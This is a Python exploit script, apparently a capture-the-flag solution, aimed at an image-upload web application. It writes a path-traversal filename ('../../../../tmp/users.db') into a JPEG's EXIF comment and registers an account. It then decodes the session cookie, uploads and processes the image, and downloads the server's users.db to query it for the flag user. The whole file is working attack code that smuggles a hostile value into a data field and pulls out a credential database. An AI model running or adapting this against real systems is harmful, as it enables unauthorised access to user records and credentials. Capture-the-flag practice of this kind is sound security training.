# Generate an image with the right exif data

import tempfile
import json
import base64
import os
import sys
import requests
import secrets
import zlib
import sqlite3
from PIL import Image
from PIL.ExifTags import TAGS

# Create an empty image of one pixel
image = Image.new('RGB', (1, 1))


exif = image.getexif()

# Write to the 'UserComment' tag
reverse_tags = {v: k for k, v in TAGS.items()}
exif[reverse_tags['UserComment']] = b'USER=foo:111231111111111111111111111111111111111111 ;\nFilename: ../../../../tmp/users.db\n'

img_out_fname = os.path.dirname(__file__) + '/img_out.jpg'
image.save(img_out_fname, exif=exif)


print(f'Image saved to {img_out_fname}')

HOST = sys.argv[1]

# register
username = secrets.token_hex(16)
password = secrets.token_hex(16)
r = requests.post(f'{HOST}/register', data={'username': username, 'password': password}, allow_redirects=False)
assert r.status_code == 302
print(f'Registered {username} with password {password}')
# log in
r = requests.post(f'{HOST}/login', data={'username': username, 'password': password}, allow_redirects=False)
assert r.status_code == 302
# get the session cookie
cookie = r.cookies
print(f'Logged in as {username}')

# Print the cookie
session = cookie['session']
print(session)
assert session[0] == '.'
payload = session.split('.')[1].replace('-', '+').replace('_', '/')
print(payload)
payload = base64.b64decode(payload + '===')
# unzip
payload = zlib.decompress(payload)
payload = json.loads(payload.decode())
user_id = payload['user_id']

# upload the image
with open(img_out_fname, 'rb') as f:
    r = requests.post(f'{HOST}/upload', files={'file': f}, cookies=cookie, allow_redirects=False)
    assert r.status_code == 400
    print('Uploaded image')
    # get the file name
    print(r.text)
    file_name = r.text.split('Error processing file ')[1].split('</p>')[0]
    print(f'File name: {file_name}')

# 'Process'
r = requests.post(f'{HOST}/process', data={'file_name': file_name}, cookies=cookie, allow_redirects=False)
assert r.status_code == 302

db = requests.get(f'{HOST}/static/{user_id}/users.db')

with tempfile.NamedTemporaryFile(delete_on_close=True) as f:
    f.write(db.content)
    f.flush()
    print(f.name)
    conn = sqlite3.connect(f.name)
    c = conn.cursor()
    c.execute('SELECT * FROM users where username = "flag"')
    print(c.fetchall())



